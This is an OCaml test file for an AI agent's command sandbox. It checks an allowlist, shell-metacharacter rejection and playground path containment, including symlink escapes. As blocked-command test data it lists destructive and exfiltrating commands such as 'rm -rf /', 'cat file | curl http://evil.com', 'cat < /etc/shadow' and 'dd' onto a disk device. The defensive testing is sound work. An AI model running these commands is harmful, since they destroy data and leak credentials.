(** Tests that tool_execute blocks dangerous commands via allowlist.

    Validates:
    1. Allowed commands (scripts/dune-local.sh, git, rg, etc.) pass validation
    2. Dangerous commands (rm, curl, kill, etc.) are blocked
    3. Shell metacharacters (;, |, &, etc.) are rejected
    4. Empty commands are rejected *)

module Workspace = Masc.Workspace
module Keeper_meta_tool_access = Masc.Keeper_meta_tool_access
module Exec_core = Masc.Exec_core
module Keeper_tool_command_runtime = Masc.Keeper_tool_command_runtime
module Keeper_registry = Masc.Keeper_registry
module Keeper_sandbox = Masc.Keeper_sandbox
module Keeper_sandbox_docker = Masc.Keeper_sandbox_docker
module Keeper_types = Keeper_types
module Exec_program = Masc_exec.Exec_program
module Json = Yojson.Safe.Util

let validate cmd =
  match Exec_policy.parse_string_to_ir ~mode:Strict cmd with
  | Ok ir -> Exec_policy.validate_command ir
  | Error reason -> Error reason
;;

let is_ok = function Ok () -> true | Error _ -> false
let is_error = function Error _ -> true | Ok () -> false
let error_msg = function Error m -> Exec_policy.block_reason_to_string m | Ok () -> ""

let test_allowed_commands () =
  let allowed = [
    "scripts/dune-local.sh build";
    "git status";
    "git log --oneline -5";
    "rg 'pattern' lib/";
    "grep -rn pattern lib";
    "make test";
    "python3 script.py";
    "npm run build";
    "pnpm run build";
    "cat README.md";
    "ls -la";
    "head -20 file.ml";
    "opam install eio";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "allowed: %s" cmd) true (is_ok (validate cmd))
  ) allowed

let test_blocked_commands () =
  let blocked = [
    "dune build";
    "opam exec -- dune build";
    "rm -rf /";
    "rm file.txt";
    "curl https://evil.com";
    "wget http://example.com";
    "kill -9 1234";
    "killall main_eio.exe";
    "chmod 777 /etc/passwd";
    "chown root file";
    "sudo anything";
    "ssh user@host";
    "scp file user@host:";
    "dd if=/dev/zero of=/dev/sda";
    "mkfs.ext4 /dev/sda1";
    "shutdown -h now";
    "reboot";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool)
      (Printf.sprintf "blocked: %s" cmd) true (is_error (validate cmd))
  ) blocked

let test_network_block_guidance_uses_public_web_aliases () =
  let check_guidance cmd =
    let msg = error_msg (validate cmd) in
    Alcotest.(check bool)
      (cmd ^ " mentions WebSearch")
      true
      (String_util.contains_substring msg "WebSearch");
    Alcotest.(check bool)
      (cmd ^ " mentions WebFetch")
      true
      (String_util.contains_substring msg "WebFetch");
    Alcotest.(check bool)
      (cmd ^ " hides internal masc_web_search")
      false
      (String_util.contains_substring msg "masc_web_search");
    Alcotest.(check bool)
      (cmd ^ " hides internal masc_web_fetch")
      false
      (String_util.contains_substring msg "masc_web_fetch")
  in
  check_guidance "curl https://example.com";
  check_guidance "ssh user@example.com"

let test_shell_metachar_blocked () =
  let chained = [
    "ls; rm -rf /";
    "cat file | curl http://evil.com";
    "echo x && rm -rf /";
    "cat file > /etc/passwd";
    "cat < /etc/shadow";
    "ls2>/dev/null";
    "echo `whoami`";
    "echo $HOME";
  ] in
  List.iter (fun cmd ->
    let result = validate cmd in
    Alcotest.(check bool)
      (Printf.sprintf "metachar blocked: %s" cmd) true (is_error result);
    let msg = error_msg result in
    Alcotest.(check bool)
      "error mentions chaining" true
      (String.length msg > 0)
  ) chained

let test_empty_command () =
  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))

let is_write cmd =
  match Exec_policy.parse_string_to_ir ~mode:Strict cmd with
  | Ok ir ->
    let envelope = Masc_exec.Shell_ir_risk.classify (Masc_exec.Shell_ir_risk.undecided ir) in
    envelope.Masc_exec.Shell_ir_risk.risk <> Masc_exec.Shell_ir_risk.R0_Read
  | Error _ -> false
let test_write_ops_detected () =
  let writes = [
    "git push origin main";
    "git commit -m 'msg'";
    "git merge feature";
    "git rebase main";
    "git reset --hard HEAD~1";
    "git checkout other-branch";
    "git stash pop";
    "git clone https://github.com/user/repo.git";
    "git init";
    "dune clean";
    "make test";
    "make deploy";
    "make install";
    "npm publish";
    "pnpm install";
    "pnpm publish";
    "mv file1 file2";
    "cp src dst";
    "mkdir newdir";
    "touch newfile";
    "chmod 755 script.sh";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "write: %s" cmd) true (is_write cmd)
  ) writes

let test_read_ops_pass () =
  let reads = [
    "git status";
    "git log --oneline -5";
    "git diff HEAD";
    "scripts/dune-local.sh build";
    "scripts/dune-local.sh exec test.exe";
    "npm run build";
    "npm run dev";
    "pnpm run build";
    "pnpm run dev";
    "rg pattern lib/";
    "cat file.ml";
    "ls -la";
    "head -20 file.ml";
    "python3 script.py";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "read: %s" cmd) false (is_write cmd)
  ) reads

(* ── rg exit code semantics ──────────────────────────────── *)

let test_rg_exit_code_semantics () =
  (* rg: 0=matches, 1=no matches (valid), 2+=error *)
  let is_ok st = st = Unix.WEXITED 0 || st = Unix.WEXITED 1 in
  Alcotest.(check bool) "exit 0 is ok" true (is_ok (Unix.WEXITED 0));
  Alcotest.(check bool) "exit 1 (no match) is ok" true (is_ok (Unix.WEXITED 1));
  Alcotest.(check bool) "exit 2 (error) is not ok" false (is_ok (Unix.WEXITED 2));
  Alcotest.(check bool) "exit 127 (not found) is not ok" false (is_ok (Unix.WEXITED 127))

(* ── Playground path detection ──────────────────────────── *)

let playground_path_of = Masc.Keeper_alerting_path.playground_path_of_keeper

let normalize_path_for_containment path =
  Masc.Keeper_alerting_path.normalize_path_for_check path
  |> Masc.Keeper_alerting_path.strip_trailing_slashes

let temp_dir () =
  let dir = Filename.temp_file "tool_execute_safety_" "" in
  Unix.unlink dir;
  Unix.mkdir dir 0o755;
  dir

let cleanup_dir dir =
  let rec rm path =
    match Unix.lstat path with
    | { Unix.st_kind = Unix.S_DIR; _ } ->
        Array.iter (fun name -> rm (Filename.concat path name)) (Sys.readdir path);
        Unix.rmdir path
    | _ ->
        Unix.unlink path
  in
  try rm dir with _ -> ()

let rec ensure_dir path =
  if path = "" || path = "." || path = "/" then ()
  else if Sys.file_exists path then ()
  else (
    let parent = Filename.dirname path in
    if parent <> path then ensure_dir parent;
    Unix.mkdir path 0o755)

let test_playground_path_structure () =
  (* playground_path_of_keeper returns relative path ending with / *)
  Alcotest.(check string) "cheolsu"
    ".masc/playground/cheolsu/" (playground_path_of "cheolsu");
  Alcotest.(check string) "masc-improver"
    ".masc/playground/masc-improver/" (playground_path_of "masc-improver")

let is_inside_playground ~playground_abs cwd =
  let playground_abs = normalize_path_for_containment playground_abs in
  let cwd = normalize_path_for_containment cwd in
  String.starts_with ~prefix:(playground_abs ^ "/") (cwd ^ "/")
  || String.equal playground_abs cwd

let test_playground_guard_inside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Inside playground: various depths *)
  Alcotest.(check bool) "exact playground dir"
    true (is_inside_playground ~playground_abs:pg pg);
  Alcotest.(check bool) "repos subdir"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc"));
  Alcotest.(check bool) "deep nested"
    true (is_inside_playground ~playground_abs:pg (pg ^ "/repos/masc/lib/keeper"))

let test_playground_guard_outside () =
  let pg = "/project/.masc/playground/cheolsu" in
  (* Outside playground: main repo and other keepers *)
  Alcotest.(check bool) "project root"
    false (is_inside_playground ~playground_abs:pg "/project");
  Alcotest.(check bool) "project lib"
    false (is_inside_playground ~playground_abs:pg "/project/lib/keeper");
  Alcotest.(check bool) "other keeper playground"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground/sangsu");
  Alcotest.(check bool) "playground parent"
    false (is_inside_playground ~playground_abs:pg "/project/.masc/playground");
  (* Prefix attack: cheolsu2 should not match cheolsu *)
  Alcotest.(check bool) "prefix attack (cheolsu2)"
    false (is_inside_playground ~playground_abs:pg (pg ^ "2/repos"))

let test_playground_guard_trailing_slash () =
  let pg = "/project/.masc/playground/cheolsu/" in
  Alcotest.(check bool) "trailing slash exact match"
    true (is_inside_playground ~playground_abs:pg "/project/.masc/playground/cheolsu");
  Alcotest.(check bool) "trailing slash nested match"
    true
    (is_inside_playground ~playground_abs:pg
       "/project/.masc/playground/cheolsu/repos/masc")

let test_playground_guard_symlink_escape () =
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let playground = Filename.concat base ".masc/playground/cheolsu" in
  let repo_root = Filename.concat playground "repos" in
  let outside = Filename.concat base "outside" in
  let symlinked_cwd = Filename.concat repo_root "escape" in
  ensure_dir repo_root;
  ensure_dir outside;
  Unix.symlink outside symlinked_cwd;
  Alcotest.(check bool) "symlinked cwd resolving outside is rejected"
    false (is_inside_playground ~playground_abs:playground symlinked_cwd)

let test_cleanup_dir_does_not_follow_symlinks () =
  let root = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir root) @@ fun () ->
  let base = Filename.concat root "base" in
  let outside = Filename.concat root "outside" in
  let marker = Filename.concat outside "marker.txt" in
  let link = Filename.concat base "escape" in
  ensure_dir base;
  ensure_dir outside;
  let oc = open_out marker in
  output_string oc "keep me";
  close_out oc;
  Unix.symlink outside link;
  cleanup_dir base;
  Alcotest.(check bool) "cleanup removed base dir" false (Sys.file_exists base);
  Alcotest.(check bool) "outside target preserved" true (Sys.file_exists marker)

let make_config () =
  let tmp = temp_dir () in
  ensure_dir (Filename.concat tmp Common.masc_dirname);
  (tmp, Workspace.default_config tmp)

let make_base_meta ~context name =
  let json =
    `Assoc
      [
        ("name", `String name);
        ("agent_name", `String ("agent-" ^ name));
        ("trace_id", `String ("trace-" ^ name));
      ]
  in
  match Masc_test_deps.meta_of_json_fixture json with
  | Ok meta -> meta
  | Error err -> Alcotest.fail (context ^ " failed: " ^ err)

let make_docker_meta name =
  let meta = make_base_meta ~context:"make_docker_meta" name in
  { meta with
    goal = "sandbox test"
  ; sandbox_profile = Keeper_types_profile_sandbox.Docker
  ; network_mode = Keeper_types_profile_sandbox.Network_none
  }

let make_local_meta name =
  let meta = make_base_meta ~context:"make_local_meta" name in
  { meta with
    goal = "sandbox test"
  ; sandbox_profile = Keeper_types_profile_sandbox.Local
  ; network_mode = Keeper_types_profile_sandbox.Network_inherit
  }

let with_eio_fs f =
  Eio_main.run @@ fun env ->
  Fs_compat.set_fs (Eio.Stdenv.fs env);
  f ()

let read_file path =
  In_channel.with_open_bin path In_channel.input_all

let run_process ~cwd prog argv =
  let out = Filename.temp_file "tool-execute-safety-out" ".txt" in
  let err = Filename.temp_file "tool-execute-safety-err" ".txt" in
  let out_fd = Unix.openfile out [ Unix.O_WRONLY; Unix.O_TRUNC ] 0o600 in
  let err_fd = Unix.openfile err [ Unix.O_WRONLY; Unix.O_TRUNC ] 0o600 in
  let original_cwd = Sys.getcwd () in
  let pid =
    Fun.protect
      ~finally:(fun () ->
        Sys.chdir original_cwd;
        Unix.close out_fd;
        Unix.close err_fd)
      (fun () ->
        Sys.chdir cwd;
        Unix.create_process prog (Array.of_list (prog :: argv)) Unix.stdin out_fd
          err_fd)
  in
  let rec wait () =
    try Unix.waitpid [] pid with
    | Unix.Unix_error (Unix.EINTR, _, _) -> wait ()
  in
  let _, status = wait () in
  let stdout = read_file out in
  let stderr = read_file err in
  Sys.remove out;
  Sys.remove err;
  (status, stdout, stderr)

let run_process_ok ~cwd prog argv =
  match run_process ~cwd prog argv with
  | Unix.WEXITED 0, _, _ -> ()
  | status, stdout, stderr ->
    Alcotest.failf "command failed: %s status=%s stdout=%s stderr=%s" prog
      (Masc.Keeper_sandbox_exec_failure.status_label status)
      stdout stderr

let git_ok ~cwd args =
  run_process_ok ~cwd "git" ("-c" :: "core.hooksPath=/dev/null" :: args)

let write_file path content =
  ensure_dir (Filename.dirname path);
  let oc = open_out path in
  Fun.protect
    ~finally:(fun () -> close_out_noerr oc)
    (fun () -> output_string oc content)

let write_repositories_toml ~base_path ~repo_name ~url =
  let config_dir = Filename.concat base_path ".masc/config" in
  ensure_dir config_dir;
  write_file
    (Filename.concat config_dir "repositories.toml")
    (Printf.sprintf
       "[repository.%s]\nname = \"%s\"\nurl = \"%s\"\n"
       repo_name
       repo_name
       (String.escaped url))

let setup_preserved_sandbox_repo ~keeper_name =
  let base_path, config = make_config () in
  let meta = { (make_local_meta keeper_name) with tool_access = [] } in
  let remote = Filename.concat base_path ".remote-masc.git" in
  let seed = Filename.concat base_path "seed-masc" in
  git_ok ~cwd:base_path
    [ "init"; "--bare"; "-q"; "--initial-branch=main"; remote ];
  git_ok ~cwd:base_path [ "clone"; "-q"; remote; seed ];
  git_ok ~cwd:seed [ "config"; "user.email"; "test@example.com" ];
  git_ok ~cwd:seed [ "config"; "user.name"; "Test" ];
  write_file (Filename.concat seed "README.md") "v1\n";
  git_ok ~cwd:seed [ "add"; "README.md" ];
  git_ok ~cwd:seed [ "commit"; "-q"; "-m"; "init" ];
  git_ok ~cwd:seed [ "push"; "-q"; "origin"; "main" ];
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir (Filename.dirname repo_dir);
  git_ok ~cwd:(Filename.dirname repo_dir) [ "clone"; "-q"; remote; repo_dir ];
  write_repositories_toml ~base_path ~repo_name:"masc" ~url:remote;
  write_file (Filename.concat seed "README.md") "v2\n";
  git_ok ~cwd:seed [ "add"; "README.md" ];
  git_ok ~cwd:seed [ "commit"; "-q"; "-m"; "advance" ];
  git_ok ~cwd:seed [ "push"; "-q"; "origin"; "main" ];
  write_file (Filename.concat repo_dir "local-dirty.txt") "dirty\n";
  base_path, config, meta, repo_dir

let setup_deleted_tracked_files_sandbox_repo ~keeper_name =
  let base_path, config = make_config () in
  let meta = { (make_local_meta keeper_name) with tool_access = [] } in
  let remote = Filename.concat base_path ".remote-masc.git" in
  let seed = Filename.concat base_path "seed-masc" in
  git_ok ~cwd:base_path
    [ "init"; "--bare"; "-q"; "--initial-branch=main"; remote ];
  git_ok ~cwd:base_path [ "clone"; "-q"; remote; seed ];
  git_ok ~cwd:seed [ "config"; "user.email"; "test@example.com" ];
  git_ok ~cwd:seed [ "config"; "user.name"; "Test" ];
  write_file (Filename.concat seed "README.md") "v1\n";
  write_file (Filename.concat seed "config/deleted-one.txt") "tracked one\n";
  write_file (Filename.concat seed "test/fixtures/deleted-two.txt") "tracked two\n";
  git_ok
    ~cwd:seed
    [ "add"; "README.md"; "config/deleted-one.txt"; "test/fixtures/deleted-two.txt" ];
  git_ok ~cwd:seed [ "commit"; "-q"; "-m"; "init" ];
  git_ok ~cwd:seed [ "push"; "-q"; "origin"; "main" ];
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir (Filename.dirname repo_dir);
  git_ok ~cwd:(Filename.dirname repo_dir) [ "clone"; "-q"; remote; repo_dir ];
  Sys.remove (Filename.concat repo_dir "config/deleted-one.txt");
  Sys.remove (Filename.concat repo_dir "test/fixtures/deleted-two.txt");
  write_repositories_toml ~base_path ~repo_name:"masc" ~url:remote;
  write_file (Filename.concat seed "README.md") "v2\n";
  git_ok ~cwd:seed [ "add"; "README.md" ];
  git_ok ~cwd:seed [ "commit"; "-q"; "-m"; "advance" ];
  git_ok ~cwd:seed [ "push"; "-q"; "origin"; "main" ];
  base_path, config, meta, repo_dir

let parse_error_field raw =
  Yojson.Safe.from_string raw
  |> Json.member "error"
  |> Json.to_string_option

let sandbox_bundle_paths ~base_path ~meta =
  let playground =
    Filename.concat base_path (playground_path_of meta.Keeper_types.name)
    |> Masc.Keeper_alerting_path.strip_trailing_slashes
  in
  [ playground
  ; Filename.concat playground "mind"
  ; Filename.concat playground "repos"
  ]

let check_sandbox_bundle_absent ~base_path ~meta =
  sandbox_bundle_paths ~base_path ~meta
  |> List.iter (fun path ->
    Alcotest.(check bool) ("sandbox bundle path absent: " ^ path) false
      (Sys.file_exists path))

let is_repo_or_task_state_path_block err =
  String_util.contains_substring err "sandbox_repo_not_ready"
  || String_util.contains_substring err "task_state_file_path_blocked"

let test_tool_execute_rejects_parent_git_repo_cwd () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  run_process_ok ~cwd:base "git" [ "init"; "-q"; "--initial-branch=main" ];
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let repo_dir =
    Filename.concat base ".masc/playground/sangsu/repos/masc"
  in
  ensure_dir repo_dir;
  let args =
    `Assoc
      [ "cwd", `String "repos/masc"
      ; "executable", `String "cat"
      ; "argv", `List [ `String "lib/foo.ml" ]
      ]
  in
  match
    Masc.Keeper_tool_execute_path.resolve_tool_write_cwd ~config ~meta ~args
  with
  | Error err -> Alcotest.failf "cwd resolution should be path-only, got: %s" err
  | Ok cwd ->
    (match
       Masc.Keeper_tool_execute_repo_preflight.validate_cwd_ready
         ~config
         ~meta
         ~cwd
         ~allow_stale_preserved_repo_context:false
     with
     | Ok () -> Alcotest.failf "expected repo preflight rejection, got %s" cwd
     | Error err ->
    if not (is_repo_or_task_state_path_block err) then
      Alcotest.failf
        "expected sandbox_repo_not_ready or task_state_file_path_blocked, got: %s"
        err;
    if String_util.contains_substring err "sandbox_repo_not_ready" then
      Alcotest.(check bool) "parent git top-level is surfaced"
        true
        (String_util.contains_substring err base)
    else
      Alcotest.(check bool) "repo path is surfaced"
        true
        (String_util.contains_substring err "repos/masc"))

let test_tool_execute_rejects_parent_git_repo_path_arg () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  run_process_ok ~cwd:base "git" [ "init"; "-q"; "--initial-branch=main" ];
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir repo_dir;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "cat"
           ; "argv", `List [ `String "./repos/masc/.missing.ml" ]
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    Alcotest.(check bool) "sandbox_repo_not_ready"
      true
      (String_util.contains_substring err "sandbox_repo_not_ready");
    Alcotest.(check bool) "cat did not reach runtime missing-file error"
      false
      (String_util.contains_substring err "No such file or directory")
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_rejects_wrapped_git_repo_path_arg () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  run_process_ok ~cwd:base "git" [ "init"; "-q"; "--initial-branch=main" ];
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir repo_dir;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "env"
           ; ( "argv"
             , `List
                 [ `String "git"
                 ; `String "-C"
                 ; `String "./repos/masc"
                 ; `String "status"
                 ] )
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if
      not
        (String_util.contains_substring err "sandbox_repo_not_ready"
         || String_util.contains_substring err "no sandbox git clones exist"
         || String_util.contains_substring err "not in readonly allowlist")
    then Alcotest.failf "expected repo readiness/root git guard, got: %s" err
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_rg_pattern_under_repos_is_not_repo_path () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir repo_dir;
  ignore
    (Fs_compat.save_file_atomic
       (Filename.concat playground "note.txt")
       "literal repos/masc mention\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "rg"
           ; "argv", `List [ `String "repos/masc"; `String "." ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "rg pattern succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "pattern was not treated as stale repo path" false
    (raw |> String_util.contains_substring "sandbox_repo_not_ready")

let test_tool_execute_rejects_inline_git_work_tree_path_arg () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  run_process_ok ~cwd:base "git" [ "init"; "-q"; "--initial-branch=main" ];
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  ensure_dir (Filename.concat playground "repos/masc");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "--work-tree=./repos/masc"; `String "status" ]
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if
      not
        (String_util.contains_substring err "sandbox_repo_not_ready"
         || String_util.contains_substring err "no sandbox git clones exist")
    then Alcotest.failf "expected repo readiness/root git guard, got: %s" err
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_rejects_stale_worktree_path_arg () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  ensure_dir repo_dir;
  run_process_ok ~cwd:repo_dir "git" [ "init"; "-q"; "--initial-branch=main" ];
  ensure_dir (Filename.concat repo_dir ".worktrees/task");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "cat"
           ; "argv", `List [ `String "./repos/masc/.worktrees/task/.missing.ml" ]
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    Alcotest.(check bool) "sandbox_repo_not_ready"
      true
      (String_util.contains_substring err "sandbox_repo_not_ready");
    if not (String_util.contains_substring err ".worktrees/task")
    then Alcotest.failf "expected stale worktree root, got: %s" err
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_readonly_missing_worktree_path_arg_does_not_materialize () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = { (make_local_meta "readonly-missing-path-arg") with tool_access = [] } in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  let missing_worktree = Filename.concat repo_dir ".worktrees/task-missing" in
  ensure_dir repo_dir;
  run_process_ok ~cwd:repo_dir "git" [ "init"; "-q"; "--initial-branch=main" ];
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "cat"
           ; ( "argv"
             , `List
                 [ `String "./repos/masc/.worktrees/task-missing/.missing.ml" ] )
           ; "cwd", `String playground
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if not (is_repo_or_task_state_path_block err) then
      Alcotest.failf
        "expected sandbox_repo_not_ready or task_state_file_path_blocked, got: %s"
        err;
    Alcotest.(check bool) "missing worktree path arg was not materialized"
      false
      (Sys.file_exists missing_worktree)
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_missing_worktree_cwd_does_not_create_directory () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = make_local_meta "sangsu" in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let repo_dir = Filename.concat playground "repos/masc" in
  let missing_worktree = Filename.concat repo_dir ".worktrees/task-missing" in
  ensure_dir repo_dir;
  run_process_ok ~cwd:repo_dir "git" [ "init"; "-q"; "--initial-branch=main" ];
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "ls"
           ; "argv", `List []
           ; "cwd", `String "repos/masc/.worktrees/task-missing"
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if not (String_util.contains_substring err "cwd_not_directory") then
      Alcotest.failf "expected cwd_not_directory, got: %s" err;
    Alcotest.(check bool) "missing worktree was not materialized"
      false
      (Sys.file_exists missing_worktree)
  | None -> Alcotest.fail ("expected error json, got: " ^ raw)

let test_tool_execute_readonly_missing_cwd_does_not_create_directory () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = { (make_local_meta "readonly-missing-cwd") with tool_access = [] } in
  let playground = Filename.concat base (playground_path_of meta.name) in
  let missing_cwd = Filename.concat playground "mind/missing-cwd" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "ls"
           ; "argv", `List []
           ; "cwd", `String missing_cwd
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if not (String_util.contains_substring err "cwd_not_directory") then
      Alcotest.failf "expected cwd_not_directory, got: %s" err;
    Alcotest.(check bool) "readonly preflight did not mkdir" false
      (Sys.file_exists missing_cwd);
    check_sandbox_bundle_absent ~base_path:base ~meta
  | None -> Alcotest.fail ("expected missing cwd error json, got: " ^ raw)

let test_tool_execute_readonly_default_cwd_does_not_create_sandbox_bundle () =
  with_eio_fs @@ fun () ->
  let base = temp_dir () in
  Fun.protect ~finally:(fun () -> cleanup_dir base) @@ fun () ->
  let config = Workspace.default_config base in
  let meta = { (make_local_meta "readonly-default-cwd") with tool_access = [] } in
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:(`Assoc [ "executable", `String "ls"; "argv", `List [] ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    if not (String_util.contains_substring err "cwd_not_directory") then
      Alcotest.failf "expected cwd_not_directory, got: %s" err;
    check_sandbox_bundle_absent ~base_path:base ~meta
  | None -> Alcotest.fail ("expected default cwd error json, got: " ^ raw)

let git_show_file ~cwd revspec =
  match run_process ~cwd "git" [ "show"; revspec ] with
  | Unix.WEXITED 0, stdout, _ -> stdout
  | status, stdout, stderr ->
    Alcotest.failf "git show failed: status=%s stdout=%s stderr=%s"
      (Masc.Keeper_sandbox_exec_failure.status_label status)
      stdout
      stderr

let test_tool_execute_readonly_blocks_preserved_direct_repo_git_show_without_fetch () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, _repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"stale-direct-git-show"
  in
  let base_path, config, meta, repo_dir =
    base_path, config, meta, _repo_dir
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "show"; `String "origin/main:README.md" ]
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  match parse_error_field raw with
  | Some err ->
    Alcotest.(check bool) "readonly direct repo root is rejected without sync" true
      (String_util.contains_substring err "sandbox_repo_currency_sync_disabled");
    Alcotest.(check bool) "worktree remedy is surfaced" true
      (String_util.contains_substring err "repos/masc/.worktrees/<task>");
    Alcotest.(check bool) "git show did not execute" false
      (String_util.contains_substring raw "v2");
    Alcotest.(check string) "origin/main was not fetched" "v1\n"
      (git_show_file ~cwd:repo_dir "origin/main:README.md")
  | None -> Alcotest.fail ("expected stale repo error json, got: " ^ raw)

let test_tool_execute_allows_preserved_direct_repo_git_status () =
  with_eio_fs @@ fun () ->
  let base_path, config, meta, _repo_dir =
    setup_preserved_sandbox_repo ~keeper_name:"stale-direct-git-status"
  in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "git"
           ; "argv", `List [ `String "status"; `String "--short" ]
           ; "cwd", `String "repos/masc"
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "diagnostic git status succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  Alcotest.(check bool) "dirty file is visible for diagnosis" true
    (json
     |> Json.member "output"
     |> Json.to_string
     |> fun output -> String_util.contains_substring output "local-dirty.txt");
  Alcotest.(check bool) "stale gate did not block diagnostic" false
    (String_util.contains_substring raw "sandbox_repo_stale")

let test_tool_execute_allows_preserved_direct_repo_git_checkout_head_restore () =
